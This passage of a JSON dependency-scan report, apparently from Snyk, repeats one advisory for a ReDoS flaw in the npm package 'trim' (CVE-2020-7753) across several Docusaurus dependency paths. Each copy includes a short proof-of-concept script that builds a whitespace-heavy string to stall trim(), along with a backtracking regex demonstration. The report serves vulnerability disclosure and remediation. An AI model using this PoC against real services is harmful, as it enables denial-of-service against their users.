      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/plugin-google-gtag@2.4.3",
        "@docusaurus/core@2.4.3",
        "@docusaurus/mdx-loader@2.4.3",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
